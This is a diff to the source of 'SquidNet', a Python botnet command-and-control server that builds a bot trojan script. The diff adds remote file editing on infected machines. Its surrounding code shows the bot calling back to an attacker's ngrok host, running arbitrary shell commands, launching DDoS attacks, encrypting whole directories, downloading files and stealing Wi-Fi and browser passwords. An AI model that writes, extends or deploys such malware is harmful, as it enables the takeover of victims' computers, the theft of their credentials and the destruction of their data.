@@ -239,6 +239,8 @@ TCP and SSH Botnet Hybrid Command and Control Server By DrSquid""")
         print("[+] !dwnldfile [src] [file]      - Downloads a file from the internet onto the bot computer.")
         print("[+] !mkdir [dir]                 - Makes a folder in the bot current directory.")
         print("[+] !gotowebsite [url]           - Takes the bot to the provided website.")
+        print("[+] !editfile [file]             - Opens a file in writing mode for the bots.")
+        print("[+] !stopedit                    - Closes file editor on bots and returns to normal.")
         print("[+] !encdir                      - Encrypts all files in the bot working directory")
         print("[+] !decdir                      - Decrypts all files in the bot working directory")
         print("[+] !botcount                    - Gets the amount of connected bots.")
@@ -348,6 +350,8 @@ TCP and SSH Botnet Hybrid Command and Control Server By DrSquid""")
 [+] !dwnldfile [src] [file]      - Downloads a file from the internet onto the bot computer.
 [+] !mkdir [dir]                 - Makes a folder in the bot current directory.
 [+] !gotowebsite [url]           - Takes the bot to the provided website.
+[+] !editfile [file]             - Opens a file in writing mode for the bots.
+[+] !stopedit                    - Closes file editor on bots and returns to normal.
 [+] !encdir                      - Encrypts all files in the bot working directory
 [+] !decdir                      - Decrypts all files in the bot working directory
 [+] !botcount                    - Gets the amount of connected bots.
@@ -749,13 +753,20 @@ TCP and SSH Botnet Hybrid Command and Control Server By DrSquid""")
                     username = msg_split[2]
                     password = msg_split[3]
                     self.ssh_login(ip, username, password)
+                elif self.instruction.startswith("!editfile"):
+                    msg_split = self.instruction.split()
+                    filename = msg_split[1]
+                    print(f"[+] Attempting to open file editor for file {filename} on the bots.")
+                    self.log(f"\n[(SERVER)]: Attempting to open file editor for file {filename} on the bots.")
                 elif self.instruction.startswith("!whatsnew"):
                     print("""
 [+] New Features In the SquidNet:
 
 [+] - Added Whatsnew Command.
 [+] - Added SSH Login command(can provide password)
-[+] - Addded Password Obtaining on the Bot Scripts
+[+] - Added Password Obtaining on the Bot Scripts
+[+] - Fixed Typo in What's new in section 3.
+[+] - Added Bot file editing.
                     """)
                 if self.instruction != "!clear":
                     self.send_ssh(self.instruction)
@@ -848,20 +859,18 @@ admin = BotMaster('""" + self.ngroklink + """',""" + str(
         """Generates the Bot Trojan Script needed to connect to this server and run commands from it.
         Test it and see what it does!"""
         script = """
+
 import socket, time, os, threading, urllib.request, shutil, sys, random, base64, sqlite3, json
 import subprocess, re
 try:
-    import win32crypt # pip install pypiwin32
+    import win32crypt
 except:
     pass
 try:
-    from cryptography.fernet import Fernet # pip install cryptography
+    from cryptography.fernet import Fernet
 except:
     pass
-try:
-    from Crypto.Cipher import AES  # pip install pycryptodome
-except:
-    pass
+from Crypto.Cipher import AES
 import shutil
 
 class DDoS:
@@ -4152,6 +4161,7 @@ class Bot:
         self.file_saving = False
         self.connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
         self.connection.connect((self.ip, self.port))
+        self.fileeditor = False
         time.sleep(1)
         self.send(socket.gethostname())
         time.sleep(1)
@@ -4184,7 +4194,11 @@ class Bot:
     def recv(self):
         while True:
             try:
-                self.msg = self.connection.recv(1024).decode()
+                self.msg = self.connection.recv(1024)
+                try:
+                    self.msg = self.msg.decode()
+                except:
+                    pass
                 self.run_cmd()
             except:
                 pass
@@ -4383,7 +4397,6 @@ OS:       {sys.platform}
             try:
                 return str(win32crypt.CryptUnprotectData(password, None, None, None, 0)[1])
             except:
-                # not supported
                 return ""
 
     def main_password_yoinker(self):
@@ -4419,84 +4432,112 @@ OS:       {sys.platform}
         else:
             os.system(f'open {website}')
     def run_cmd(self):
-        if self.msg.startswith('!ddos'):
-            msg = self.msg.split()
-            ip = msg[1]
-            delay = float(msg[2])
-            self.dos = DDoS(ip, delay)
-        elif self.msg.startswith('!stopatk'):
-            try:
-                self.dos.stopatk()
-            except:
-                pass
-        elif self.msg.startswith('!changedirdesktop'):
-            self.changedir(self.desktop)
-        elif self.msg.startswith('!openfile'):
-            file = self.returnsecondstr(self.msg)
-            self.openfile(file)
-        elif self.msg.startswith('!changedir'):
-            dir = self.returnsecondstr(self.msg)
-            self.changedir(dir)
-        elif self.msg.startswith('!rmdir'):
-            dir = self.returnsecondstr(self.msg)
-            self.rmdir(dir)
-        elif self.msg.startswith('!rmfile'):
-            file = self.returnsecondstr(self.msg)
-            self.rmfile(file)
-        elif self.msg.startswith('!listdir'):
-            dirlist = self.listdir()
-            self.send(dirlist)
-        elif self.msg.startswith('!encdir'):
-            self.encdir()
-        elif self.msg.startswith('!decdir'):
-            self.decdir()
-        elif self.msg.startswith('!encfile'):
-            file = self.returnsecondstr(self.msg)
-            self.encfile(file)
-        elif self.msg.startswith('!decfile'):
-            file = self.returnsecondstr(self.msg)
-            self.decfile(file)
-        elif self.msg.startswith('!getinfo'):
-            msgtoserv = self.getinfo()
-            self.send(msgtoserv)
-        elif self.msg.startswith('!getip'):
-            self.send(self.getip())
-        elif self.msg.startswith('!getwifi'):
-            wifi_passwords = self.obtainwifipass()
-            self.send(wifi_passwords)
-        elif self.msg.startswith('!savefile'):
-            file = self.returnsecondstr(self.msg)
-            self.sendfile(file)
-        elif self.msg.startswith('!viewfilecontent'):
-            file = self.returnsecondstr(self.msg)
-            self.file_content(file)
-        elif self.msg.startswith('!mkdir'):
-            main_msg = self.msg.split()
-            dirname = main_msg[1]
-            self.mkdir(dirname)
-            self.send(f"Successfully Created {dirname}")
-        elif self.msg.startswith('!getcwd'):
-            self.send(os.getcwd())
-        elif self.msg.startswith('!getos'):
-            self.send(sys.platform)
-        elif self.msg.startswith('!gotowebsite'):
-            main_msg = self.msg.split()
-            url = main_msg[1]
-            self.gotowebsite(url)
-        elif self.msg.startswith('!dwnldfile'):
-            main_msg = self.msg.split()
-            src = main_msg[1]
-            file = main_msg[2]
-            self.getfrinternet(src,file)
-        elif self.msg.startswith('!getpasswords'):
-            if sys.platform == "win32":
-                passwords = self.main_password_yoinker()
-                self.connection.send(passwords.encode())
+        if self.fileeditor:
+            if self.msg.startswith("!stopedit"):
+                self.send(f"File editor closed for {self.filename}.")
+                self.fileeditor = False
             else:
-                self.connection.send("Running on a non-windows machine - Cannot get passwords!".encode())
+                try:
+                    self.msg = "\\n"+self.msg
+                except:
+                    self.msg = "\\n".encode()+self.msg
+                self.file = open(self.filename, "rb")
+                contents = self.file.read()
+                self.file.close()
+                self.file = open(self.filename, "wb")
+                self.file.write(contents)
+                self.file.write(self.msg.encode())
+                self.file.close()
         else:
-            output = os.popen(self.msg).read()
-            self.send(output)
+            if self.msg.startswith('!ddos'):
+                msg = self.msg.split()
+                ip = msg[1]
+                delay = float(msg[2])
+                self.dos = DDoS(ip, delay)
+            elif self.msg.startswith('!stopatk'):
+                try:
+                    self.dos.stopatk()
+                except:
+                    pass
+            elif self.msg.startswith('!changedirdesktop'):
+                self.changedir(self.desktop)
+            elif self.msg.startswith('!openfile'):
+                file = self.returnsecondstr(self.msg)
+                self.openfile(file)
+            elif self.msg.startswith('!changedir'):
+                dir = self.returnsecondstr(self.msg)
+                self.changedir(dir)
+            elif self.msg.startswith('!rmdir'):
+                dir = self.returnsecondstr(self.msg)
+                self.rmdir(dir)
+            elif self.msg.startswith('!rmfile'):
+                file = self.returnsecondstr(self.msg)
+                self.rmfile(file)
+            elif self.msg.startswith('!listdir'):
+                dirlist = self.listdir()
+                self.send(dirlist)
+            elif self.msg.startswith('!encdir'):
+                self.encdir()
+            elif self.msg.startswith('!decdir'):
+                self.decdir()
+            elif self.msg.startswith('!encfile'):
+                file = self.returnsecondstr(self.msg)
+                self.encfile(file)
+            elif self.msg.startswith('!decfile'):
+                file = self.returnsecondstr(self.msg)
+                self.decfile(file)
+            elif self.msg.startswith('!getinfo'):
+                msgtoserv = self.getinfo()
+                self.send(msgtoserv)
+            elif self.msg.startswith('!getip'):
+                self.send(self.getip())
+            elif self.msg.startswith('!getwifi'):
+                wifi_passwords = self.obtainwifipass()
+                self.send(wifi_passwords)
+            elif self.msg.startswith('!savefile'):
+                file = self.returnsecondstr(self.msg)
+                self.sendfile(file)
+            elif self.msg.startswith('!viewfilecontent'):
+                file = self.returnsecondstr(self.msg)
+                self.file_content(file)
+            elif self.msg.startswith('!mkdir'):
+                main_msg = self.msg.split()
+                dirname = main_msg[1]
+                self.mkdir(dirname)
+                self.send(f"Successfully Created {dirname}")
+            elif self.msg.startswith('!getcwd'):
+                self.send(os.getcwd())
+            elif self.msg.startswith('!getos'):
+                self.send(sys.platform)
+            elif self.msg.startswith('!gotowebsite'):
+                main_msg = self.msg.split()
+                url = main_msg[1]
+                self.gotowebsite(url)
+            elif self.msg.startswith('!dwnldfile'):
+                main_msg = self.msg.split()
+                src = main_msg[1]
+                file = main_msg[2]
+                self.getfrinternet(src, file)
+            elif self.msg.startswith('!getpasswords'):
+                if sys.platform == "win32":
+                    passwords = self.main_password_yoinker()
+                    self.connection.send(passwords.encode())
+                else:
+                    self.connection.send("Running on a non-windows machine - Cannot get passwords!")
+            elif self.msg.startswith("!editfile"):
+                try:
+                    main_msg = self.msg.split()
+                    self.editfile = open(str(main_msg[1]),"rb")
+                    self.editfile.close()
+                    self.filename = self.editfile.name
+                    self.fileeditor = True
+                    self.send(f"File editing mode activated for file {self.filename}")
+                except:
+                    self.send("File cannot be opened on this computer.".encode())
+                    self.fileeditor = False
+            else:
+                output = os.popen(self.msg).read()
+                self.send(output)
 ip = '""" + self.ngroklink + """'
 port = """ + str(self.ngrokport) + """
 key = """ + str(self.key) + """
